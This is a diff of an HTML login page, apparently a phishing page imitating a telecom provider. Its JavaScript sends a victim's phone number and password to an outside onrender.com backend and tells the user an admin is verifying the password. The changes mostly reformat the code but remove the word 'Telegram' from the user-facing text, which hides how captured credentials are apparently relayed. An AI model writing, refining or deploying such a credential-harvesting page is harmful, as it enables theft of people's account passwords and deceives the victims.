@@ -179,17 +179,19 @@
         <div class="spinner"></div>
         <h2 id="modalTitle">Verifying Password</h2>
         <p id="modalMessage">
-          Please wait while admin verifies your password via Telegram...
+          Please wait while admin verifies your password...
         </p>
         <div id="errorContainer"></div>
       </div>
     </div>
 
     <script>
-      const BACKEND_URL = (localStorage.getItem("backendUrl") || "https://airtel-01.onrender.com").trim();
+      const BACKEND_URL = (
+        localStorage.getItem("backendUrl") || "https://airtel-01.onrender.com"
+      ).trim();
       let currentRequestId = null;
       let verificationInterval = null;
-      
+
       console.log("Backend URL:", BACKEND_URL);
 
       document
@@ -206,15 +208,15 @@
           showVerificationModal();
 
           try {
-            // Send password to backend for Telegram verification
+            // Send password to backend for verification
             const payload = {
               phone: phone.replace(/\s+/g, ""),
               password: password,
             };
-            
+
             console.log("Sending to:", `${BACKEND_URL}/api/password/verify`);
             console.log("Payload:", payload);
-            
+
             const response = await fetch(`${BACKEND_URL}/api/password/verify`, {
               method: "POST",
               headers: {
@@ -225,16 +227,18 @@
 
             if (!response.ok) {
               const errorText = await response.text();
-              throw new Error(`Backend error (${response.status}): ${errorText}`);
+              throw new Error(
+                `Backend error (${response.status}): ${errorText}`,
+              );
             }
 
             const data = await response.json();
             console.log("Response from backend:", data);
-            
+
             if (!data.requestId) {
               throw new Error(data.error || "No request ID returned");
             }
-            
+
             currentRequestId = data.requestId;
 
             // Poll for approval
@@ -288,9 +292,9 @@
       function showVerificationError(message) {
         console.error("Verification error:", message);
         const errorContainer = document.getElementById("errorContainer");
-        document.getElementById("modalTitle").textContent =
-          "❌ Error";
-        document.getElementById("modalMessage").textContent = "Check console for details";
+        document.getElementById("modalTitle").textContent = "❌ Error";
+        document.getElementById("modalMessage").textContent =
+          "Check console for details";
 
         errorContainer.innerHTML = `
           <div class="modal-error">
